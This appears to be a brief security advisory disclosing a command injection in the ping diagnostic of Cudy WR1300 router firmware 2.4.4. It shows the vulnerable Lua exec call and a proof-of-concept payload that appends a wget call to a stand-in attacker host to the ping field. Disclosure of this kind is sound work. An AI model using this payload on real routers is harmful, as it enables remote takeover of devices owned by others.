# Cudy WR1300 2.4.4 - Command Injection via Ping (RCE)

## Overview

A critical Command Injection vulnerability was identified in the firmware of the **Cudy WR1300 router**, version **2.4.4 (Build 2025-05-07)**.  
The issue affects the diagnostic **ping functionality** implemented through the LuCI web interface.

## Affected Component

- `/usr/lib/lua/luci/model/cbi/tools/ping.lua`

## Vulnerability Details

The vulnerability is caused by unsafe handling of user input, which is directly concatenated into system commands using:

```lua
luci.util.exec("ping -c 4 -W 1 " .. user_input)

## Impact

An attacker can inject arbitrary system commands through the ping parameter, leading to Remote Code Execution (RCE) on the device.

## Proof of Concept (PoC)

### Payload

```bash
127.0.0.1; wget http://ATTACKER_IP:7777/poc

<img width="1098" height="301" alt="2026-04-08 00_32_00-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/210681df-6069-4e6c-a426-62cf7131147b" />
<img width="1080" height="126" alt="2026-04-08 00_34_17-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/d77ac631-fe80-4184-9d76-1c8750cefe0e" />

